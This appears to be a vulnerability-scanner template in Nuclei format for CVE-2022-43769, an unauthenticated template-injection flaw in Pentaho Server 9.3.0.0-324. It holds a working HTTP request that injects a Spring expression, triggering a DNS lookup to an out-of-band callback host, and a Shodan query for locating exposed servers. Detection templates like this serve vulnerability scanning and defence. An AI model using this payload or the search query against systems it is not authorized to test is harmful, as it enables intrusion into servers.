id: CVE-2022-43769

info:
  name: Pentaho Server 9.3.0.0-324 - Unauthenticated SSTI
  author: dwbzn
  severity: Critical
  description: Unauthenticated RCE in Pentaho Server via template injection
  reference:
    - https://research.aurainfosec.io/pentest/pentah0wnage
  tags: cve,cve2022,pentaho,unauthenticated
  shodan-query: http.html:"content=\"0;URL=/pentaho\""

requests:
  - raw:
      - |+
        GET /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName('{{interactsh-url}}')}&mgrDn=a&pwd=a HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
